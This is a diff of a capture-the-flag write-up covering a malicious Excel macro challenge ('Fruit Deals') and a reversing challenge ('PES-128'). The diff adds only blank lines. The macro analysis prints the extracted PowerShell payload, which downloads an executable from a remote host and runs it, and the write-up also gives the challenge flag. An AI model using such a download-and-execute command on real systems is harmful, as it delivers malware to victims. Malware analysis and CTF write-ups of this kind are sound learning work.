@@ -21,31 +21,38 @@ for i in a:
 ## Fruit Deals
 
 We got 2 macros in the file, let's just focus on the first one.
+
 ![image](https://github.com/san601/CTF_Archive/assets/144963803/dbbb6c1f-13ce-4b0a-9be0-603733d6e8c5)
 
 Sheet1 and sheet2 were full of random Base64 stuffs
+
 ![image](https://github.com/san601/CTF_Archive/assets/144963803/fcd327de-3178-40ac-9e8f-fe58d4ff2c6b)
 
 So basically, this macro check if a cell contained some string, if true, it put some part of a payload into a variable. This payload might be used to download some files.
+
 ![image](https://github.com/san601/CTF_Archive/assets/144963803/e5882d47-aff1-4325-8f9f-85c6cccc4b47)
 
 Set a breakpoint just right before the macro execute the payload.
+
 ![image](https://github.com/san601/CTF_Archive/assets/144963803/bd1e358a-96e3-4d55-8b36-b830f26b5e24)
 
 We got the payload
 ```
 "poWeRsHELL -command "$oaK = new-object Net.WebClient;$OrA = 'http://fruit.gang/malware';$CNTA = 'banANA-Hakrz09182afd4';$jri=$env:public+'\'+$CNTA+'.exe';try{$oaK.DownloadFile($OrA, $jri);Invoke-Item $jri;break;} catch {}""
 ```
+
 It is clearly stated that the macro was going to download a file from 
 ```
 http://fruit.gang/malware/banANA-Hakrz09182afd4.exe
 ```
+
 So the flag is utflag{banANA-Hakrz09182afd4.exe}
 
 ## PES-128
 After a while, I noticed that:
 - Each character in the output string was not calculated based on a whole input string.
 - The program treated our input as a string of hex bytes:
+  
 This was my input:
 ![image](https://github.com/san601/CTF_Archive/assets/144963803/9a8d78c6-d231-4bbe-95ed-a656085d0936)
 
@@ -85,5 +92,6 @@ for i in range(flag_len):
 
 print(bytes.fromhex(flag))
 ```
+
 ![image](https://github.com/san601/CTF_Archive/assets/144963803/d3b4acb1-c6bc-4871-8fd9-c4e1fcc69397)
 
